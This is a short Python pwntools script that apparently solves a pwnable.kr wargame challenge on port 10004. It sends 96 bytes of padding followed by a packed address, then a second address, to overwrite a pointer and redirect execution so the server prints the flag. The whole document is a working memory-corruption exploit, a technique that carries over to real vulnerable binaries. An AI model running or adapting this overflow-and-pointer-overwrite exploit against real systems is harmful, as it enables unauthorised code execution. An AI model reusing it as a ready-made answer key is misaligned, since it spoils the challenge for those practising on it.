from pwn import *

r = remote("pwnable.kr",10004)

payload = "a" * 96
payload += '\x14\xc0\x04\x08'

r.recv()
r.sendline(payload)
r.recv()
r.sendline(str(int(0x8049292)) )
data = r.recv(1024)
print(data)
flag = r.recv(1024)
print(flag)
